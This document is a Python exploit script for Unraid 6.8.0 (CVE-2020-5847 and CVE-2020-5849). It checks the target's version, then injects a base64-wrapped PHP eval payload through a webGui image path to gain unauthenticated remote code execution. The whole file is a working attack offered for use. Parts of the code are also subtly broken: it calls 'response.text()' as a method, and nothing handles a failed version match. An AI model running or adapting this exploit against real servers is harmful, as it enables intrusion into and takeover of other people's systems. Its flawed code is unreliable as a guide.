#!/usr/bin/env python3
# Unraid 6.8.0 - Auth Bypass PHP Code Execution
# CVE-2020-5847
# CVE-2020-5849
# https://forums.unraid.net/topic/88253-critical-security-vulnerabilies-discovered/
# https://www.exploit-db.com/exploits/48353
# Author: https://github.com/1Gould

import sys
import requests
import re
import base64
from urllib.parse import urlparse, urlunparse, quote

def main(argv):
    version = "6.8.0"
    baseUrl = argv[0]
    payload = argv[1]
    targetUri = "webGui/images/green-on.png/"
    url = url_fix(baseUrl + targetUri)
    print("Checking if the version is vulnerable.\n")
    if check(url, version):  # Pass version here
        print("Starting Exploit.\n")
        exploit(url, payload)
    else:
        print("Quitting...")
        exit()

def check(url, version):
    try:
        response = requests.get(url)
    except requests.exceptions.RequestException as e:
        print(f"Received unexpected error: {e}")
        exit()

    match = re.search(r"\sVersion:\s(?P<version>\d{1,2}\.\d{1,2}\.\d{1,2})&nbsp;", response.text())
    if match.group('version') == version:
        print(f"Unraid is running version {version} and is vulnerable.\n")
        return True
    else:
        print(f"Target Unraid application is not vulnerable, it appears to be running version {match.group('version')}.\n")
        return False

def url_fix(url):
    parts = urlparse(url)
    return urlunparse(parts._replace(path=quote(parts.path)))

def exploit(url, payload):
    payload = base64.b64encode(payload.encode()).decode('utf-8')
    payload = f"<?php eval(base64_decode('{payload}')) ?>"
    try:
        response = requests.get(url, params={"path": "x", "site[x][text]": payload})
        print("-----------------------")
        print(response.text)
        print("-----------------------")
    except requests.exceptions.RequestException as e:
        print(f"Received unexpected error: {e}")
        exit()

if __name__ == "__main__":
    main(sys.argv[1:])
